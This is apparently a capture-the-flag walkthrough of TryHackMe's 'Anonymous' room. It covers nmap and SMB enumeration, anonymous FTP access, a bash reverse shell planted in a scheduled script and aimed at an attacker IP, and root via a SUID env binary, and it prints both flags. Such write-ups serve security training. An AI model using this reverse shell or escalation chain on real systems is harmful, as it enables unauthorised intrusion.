Anonymous TryHackMe Walkthrough: From FTP Access to Root

MY
Mohamed Yassine Bougamra
TryHackMe Anonymous FTP Privilege Escalation
⚠️ Spoiler warning: this post contains the complete solution for the Anonymous room. Try the room yourself first if you want to solve it without hints.

Anonymous is a compact TryHackMe room built around a straightforward but useful attack chain. It starts with network and SMB enumeration, moves through anonymous FTP access and a reverse shell, and finishes with a SUID-based privilege escalation.

This is the route I followed from the initial scan to both flags.

Step 1: Network Enumeration with Nmap

I began with a full TCP scan to identify the services exposed by the target.

recon.shnmap
nmap -p- <target-ip>

The scan showed four open ports, including FTP on port 21 and SMB on ports 139 and 445. Those services gave me two promising directions for the next stage.

Step 2: SMB Enumeration

I checked the available SMB shares to see whether the target exposed files that could help with the foothold.

smb-enum.shsmbclient
smbclient -L <target-ip>

The interesting share was called pics. I kept that information for later and moved to the FTP service, which allowed anonymous login.

Step 3: Gaining Initial Access Through FTP

I connected to FTP and tested the default anonymous account.

ftp-login.txtftp
ftp <target-ip>
Username: Anonymous

After logging in, I navigated to the scripts directory and uploaded a reverse-shell script.

upload.shftp
put clean.sh

I edited clean.sh so it would connect back to my machine:

clean.shreverse-shell
#!/bin/bash
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1

Before triggering the script, I started a Netcat listener on the same port:

listener.shnetcat
nc -nlvp 4444

Once the scheduled script executed, the listener received a shell on the target.

Step 4: Capturing the User Flag

With access to the machine, I checked the available files and entered the pics directory identified during SMB enumeration.

user-flag.shshell
ls
cd pics
cat user.txt

The user flag was:

user.txtflag
90d6f992585815ff991e68748c414740

Step 5: Privilege Escalation

Next, I searched for SUID binaries owned by root. These binaries can be dangerous when they expose a way to execute commands with elevated privileges.

suid-enum.shprivilege-escalation
find / -user root -perm -u=s 2>/dev/null

The binary that stood out was /usr/bin/env. GTFOBins documents a way to use it to start a privileged shell.

env-root.shgtfobins
env /bin/sh -p
whoami

The output confirmed that the shell was running as root.

Step 6: Capturing the Root Flag

With root access, I navigated to the root directory and read the final flag.

root-flag.shshell
cd /root
cat root.txt
root.txtflag
4d930091c31a622a7ed10f27999af363

Takeaways

Anonymous is a good beginner-friendly exercise because every step reinforces a practical habit: scan broadly, inspect exposed services, test default access carefully, and always check for simple privilege-escalation paths such as SUID binaries.

If you want to practice the same chain, try Anonymous on TryHackMe before reading the walkthrough.
